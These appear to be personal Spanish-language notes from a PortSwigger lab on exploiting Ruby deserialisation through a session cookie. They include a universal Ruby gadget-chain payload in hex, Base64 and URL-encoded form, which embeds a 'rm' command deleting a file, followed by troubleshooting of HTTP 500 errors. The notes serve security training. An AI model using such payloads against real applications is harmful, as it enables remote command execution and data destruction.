![[Pasted image 20221018110749.png]]

criterio de busqueda: Universal Deserialisation Gadget for Ruby 2.x-3.x` by `vakzz` on `devcraft.io`

![[Pasted image 20221018110936.png]]

https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html

https://www.elttam.com/blog/ruby-deserialization

de la ultima pagina tome el payload:

![[Pasted image 20230621180854.png]]

lo copie en un directorio y de ahi se ejecuta:

![[Pasted image 20230621181021.png]]

![[Pasted image 20230621181045.png]]

Payload (hex):
0408553a1547656d3a3a526571756972656d656e745b066f3a1847656d3a3a446570656e64656e63794c697374073a0b4073706563735b076f3a1e47656d3a3a536f757263653a3a537065636966696346696c65063a0a40737065636f3a1b47656d3a3a5374756253706563696669636174696f6e063a11406c6f616465645f66726f6d4922207c726d202f686f6d652f6361726c6f732f6d6f72616c652e747874063a0645546f3b08003a1140646576656c6f706d656e7446

Payload (Base64 encoded):
BAhVOhVHZW06OlJlcXVpcmVtZW50WwZvOhhHZW06OkRlcGVuZGVuY3lMaXN0
BzoLQHNwZWNzWwdvOh5HZW06OlNvdXJjZTo6U3BlY2lmaWNGaWxlBjoKQHNw
ZWNvOhtHZW06OlN0dWJTcGVjaWZpY2F0aW9uBjoRQGxvYWRlZF9mcm9tSSIg
fHJtIC9ob21lL2Nhcmxvcy9tb3JhbGUudHh0BjoGRVRvOwgAOhFAZGV2ZWxv
cG1lbnRG

el ultimo payload lo paso al decoder de burp y lo encodeo como URL:

![[Pasted image 20230621181325.png]]

%42%41%68%56%4f%68%56%48%5a%57%30%36%4f%6c%4a%6c%63%58%56%70%63%6d%56%74%5a%57%35%30%57%77%5a%76%4f%68%68%48%5a%57%30%36%4f%6b%52%6c%63%47%56%75%5a%47%56%75%59%33%6c%4d%61%58%4e%30%0a%42%7a%6f%4c%51%48%4e%77%5a%57%4e%7a%57%77%64%76%4f%68%35%48%5a%57%30%36%4f%6c%4e%76%64%58%4a%6a%5a%54%6f%36%55%33%42%6c%59%32%6c%6d%61%57%4e%47%61%57%78%6c%42%6a%6f%4b%51%48%4e%77%0a%5a%57%4e%76%4f%68%74%48%5a%57%30%36%4f%6c%4e%30%64%57%4a%54%63%47%56%6a%61%57%5a%70%59%32%46%30%61%57%39%75%42%6a%6f%52%51%47%78%76%59%57%52%6c%5a%46%39%6d%63%6d%39%74%53%53%49%67%0a%66%48%4a%74%49%43%39%6f%62%32%31%6c%4c%32%4e%68%63%6d%78%76%63%79%39%74%62%33%4a%68%62%47%55%75%64%48%68%30%42%6a%6f%47%52%56%52%76%4f%77%67%41%4f%68%46%41%5a%47%56%32%5a%57%78%76%0a%63%47%31%6c%62%6e%52%47

me voy al lab y me logeo con las credenciales de wiener, pongo el intercept en off durante todo el proceso:

![[Pasted image 20230621181709.png]]

luego de logearme doy click en el boton Home y busco esa traza para enviarla al repeater:

![[Pasted image 20230621181819.png]]

![[Pasted image 20230621181845.png]]

![[Pasted image 20230621181906.png]]

en la cookie session sustituyo el payload encodeado en formato url y le doy enviar:

![[Pasted image 20230621182359.png]]

sin embargo no entiendo porque obtengo error 500:

![[Pasted image 20230621182429.png]]

probe tambien poniendo el payload en una sola linea asi como otros videos y es el mismo procedimiento pero siempre obtengo el error 500. 

Probando el payload de esta pagina: https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html

![[Pasted image 20230625201226.png]]

al intentarlo ejecutar:

![[Pasted image 20230625201402.png]]

leyendo la solucion oficial encontre esto:

![[Pasted image 20230625204400.png]]

verificando el payload ya tiene esta linea:

![[Pasted image 20230625204516.png]]

mandando el payload sin encodear el error 500 es por esto:

![[Pasted image 20230625204819.png]]

hay una entrada en el blog de portswigger con ese problema: https://forum.portswigger.net/thread/no-such-file-or-directory-error-ruby-deserialization-2cc41445

![[Pasted image 20230625205456.png]]

parece que el rollo es el compilador de ruby, el procedimiento aparentemente es el correcto:

![[Pasted image 20230625205653.png]]

al final del mismo post se supone que es el codigo del payload y que este funciona:

![[Pasted image 20230625210649.png]]

que es este: https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html





